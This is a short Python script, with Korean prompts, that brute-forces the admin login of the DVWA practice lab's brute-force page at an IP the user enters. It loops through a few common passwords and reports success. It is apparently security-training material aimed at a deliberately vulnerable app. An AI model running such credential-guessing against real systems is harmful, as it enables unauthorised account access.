import requests

ip = input("ip를 입력하세요")
url = f"http://{ip}/vulnerabilities/brute/"
passwords = ["1234", "password", "admin", "letmein"]
cookies = {"security": "low", "PHPSESSID": "당신의_세션_ID"}

for pwd in passwords:
    response = requests.get(f"{url}?username=admin&password={pwd}&Login=Login", cookies=cookies)
    if "Username and/or password incorrect." not in response.text:
        print(f"[+] 성공: admin / {pwd}")
        break